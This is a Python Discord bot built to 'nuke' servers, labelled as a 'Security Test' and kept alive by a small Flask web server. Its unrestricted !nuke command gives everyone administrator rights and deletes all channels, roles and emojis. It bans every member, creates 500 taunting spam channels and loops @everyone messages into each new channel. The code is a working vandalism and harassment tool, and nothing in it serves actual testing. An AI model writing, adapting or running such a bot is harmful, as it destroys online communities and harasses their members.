import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio
import os
from dotenv import load_dotenv
from threading import Thread
from flask import Flask

# Load environment variables
load_dotenv()
token = os.getenv('BOT_TOKEN')

SPAM_CHANNEL = ["Testnoob256 runs you", "Get ran", "Testnoob256", "oops Beamed",
                "Testnoob256 Beamed You", "Shoulda Listened", "Get beamed clowns",
                "Beamed by Testnoob256", "oops got nuked", "I run you",
                "beamed by Testnoob256", "I run you", "kinda got beamed by Testnoob256"]
SPAM_MESSAGE = ["@everyone Security Test in Progress"]

# ===== WEB SERVER FOR RENDER (KEEP ALIVE) =====
app = Flask(__name__)

@app.route('/')
def home():
    return "Discord Bot is Running!", 200

@app.route('/health')
def health():
    return {"status": "alive", "bot": "online"}, 200

def run_web():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))

# ===== INTENTS CONFIGURATION =====
intents = discord.Intents.default()
intents.members = True
intents.guilds = True
intents.message_content = True

# ===== BOT CREATION WITH INTENTS =====
client = commands.Bot(command_prefix="!", intents=intents)


@client.event
async def on_ready():
    print(''' 
   
███╗░░██╗██╗░░░██╗██╗░░██╗███████╗  ██████╗░░█████╗░████████╗
████╗░██║██║░░░██║██║░██╔╝██╔════╝  ██╔══██╗██╔══██╗╚══██╔══╝ 
██╔██╗██║██║░░░██║█████═╝░█████╗░░  ██████╦╝██║░░██║░░░██║░░░ 
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░  ██╔══██╗██║░░██║░░░██║░░░ 
██║░╚███║╚██████╔╝██║░╚██╗███████╗  ██████╦╝╚█████╔╝░░░██║░░░  
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═════╝░░╚════╝░░░░╚═╝░░░ 
 ''')
    await client.change_presence(activity=discord.Game(name="Security Testing"))
    print(f"{client.user.name} is now online!")
    print(f"Bot is in {len(client.guilds)} server(s)")

@client.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.close()
    print(Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)

@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
        print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
        except:
            print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
        try:
            await member.ban()
            print(Fore.MAGENTA + f"{member.name} Was banned" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{member.name} Was unable to be banned." + Fore.RESET)
    for role in guild.roles:
        try:
            await role.delete()
            print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
        user = ban_entry.user
        try:
            await guild.unban(user, reason="Security Test")
            print(Fore.MAGENTA + f"{user.name} Was successfully unbanned." + Fore.RESET)
        except:
            print(Fore.GREEN + f"{user.name} Was not unbanned." + Fore.RESET)
    await guild.create_text_channel("NUKED BITCH")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age=0, max_uses=0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"nuked {guild.name} Successfully.")
    return

@client.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(random.choice(SPAM_MESSAGE))

# Run the bot
if __name__ == "__main__":
    if not token:
        print("ERROR: BOT_TOKEN not found in environment variables!")
        print("Please set BOT_TOKEN in Render's environment variables.")
    else:
        # Start web server in background thread
        print("Starting web server...")
        Thread(target=run_web, daemon=True).start()
        
        # Start Discord bot
        print("Starting Discord bot...")
        client.run(token)
